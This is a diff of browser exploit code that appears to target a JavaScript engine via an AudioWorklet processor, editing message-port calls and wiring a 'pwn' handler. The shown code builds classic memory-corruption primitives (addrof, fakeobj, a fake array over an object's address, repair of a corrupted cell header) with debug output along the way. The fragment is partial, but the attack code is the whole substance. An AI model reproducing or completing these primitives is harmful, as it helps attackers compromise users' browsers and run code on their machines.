@@ -650,9 +650,9 @@ b.process = (inputs, outputs, parameters)=>{
           delete b1[1];
 
           function setupPrimitives() {
-            port.postMessage("setting up");
+            fuck.port.postMessage("setting up");
             if (a1.length != 0x1337) {
-              port.postMessage("Failure on array length");
+              fuck.port.postMessage("Failure on array length");
               return;
             }
 
@@ -668,7 +668,7 @@ b.process = (inputs, outputs, parameters)=>{
               }
             }
             if (offset == -1) {
-              port.postMessage("Failure finding offset");
+              fuck.port.postMessage("Failure finding offset");
               return;
             }
 
@@ -688,13 +688,13 @@ b.process = (inputs, outputs, parameters)=>{
             };
 
             let addr = addrof(obj);
-            port.postMessage("obj @ " + addr.toString(16));
+            fuck.port.postMessage("obj @ " + addr.toString(16));
 
             let fakeArr = fakeobj(addr + 0x10n);
 
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
-            port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
+            fuck.port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
 
             // fix broken cell header
             fakeArr[0] = bigint2float(doubleArrayCellHeader);
@@ -742,8 +742,8 @@ b.process = (inputs, outputs, parameters)=>{
           registerProcessor("OrigineWorklet", class {
             constructor() {
               // setup a message port to the main thread
-              //port = new AudioWorkletProcessor().port;
-              //port.onmessage = pwn;
+              var port = new AudioWorkletProcessor().port;
+              port.onmessage = pwn;
               //fuck = this;
 
               // this part is magic
